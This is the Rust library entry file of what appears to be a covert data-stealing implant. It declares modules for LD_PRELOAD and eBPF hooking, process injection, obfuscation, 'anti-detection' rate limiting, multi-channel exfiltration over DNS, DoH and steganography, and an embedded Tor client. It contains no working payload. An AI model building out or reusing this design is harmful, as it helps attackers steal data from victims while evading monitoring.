// Library entry point for shared library builds
pub mod hook;
#[cfg(target_os = "linux")]
pub mod hook_lib; // LD_PRELOAD hook library (separate cdylib)
pub mod exfil;
pub mod crypto;
pub mod buffer;
pub mod advanced_evasion;
pub mod quantum_obfuscation;
pub mod error_handling;
pub mod logging;
pub mod obfuscate;
pub mod config;
pub mod injection;
pub mod proto;
#[cfg(target_os = "linux")]
pub mod ipc; // Memory-only IPC (Abstract sockets, memfd)
#[cfg(feature = "ebpf")]
pub mod ebpf_hooks; // eBPF kernel-level hooking
#[cfg(feature = "ai-filtering")]
pub mod ai_filtering; // AI-driven data filtering
#[cfg(feature = "post-quantum")]
pub mod pqc; // Post-quantum cryptography (Kyber/Dilithium)
pub mod multi_channel; // Multi-channel exfiltration (DNS, DoH, steganography)
pub mod tor_client; // Embedded Tor client
pub mod rate_limiter; // Rate limiting for exfiltration (anti-detection)

// Re-export commonly used types
pub use crypto::CryptoManager;
pub use hook::HookManager;
pub use buffer::RingBuffer;
pub use logging::{Metrics, Logger};
pub use config::MissionConfig;

#[cfg(test)]
mod tests {
    use super::*;
    
    #[tokio::test]
    #[cfg(target_os = "linux")]
    async fn test_ipc_basic() {
        use crate::ipc::MemfdRingBuffer;
        let buffer = MemfdRingBuffer::new(1024);
        assert!(buffer.is_ok());
    }
    
    #[tokio::test]
    #[ignore]
    async fn test_tor_client() {
        use crate::tor_client::EmbeddedTorClient;
        let client = EmbeddedTorClient::new();
        // Test is ignored by default - requires Tor
        let _ = client.initialize().await;
    }
}
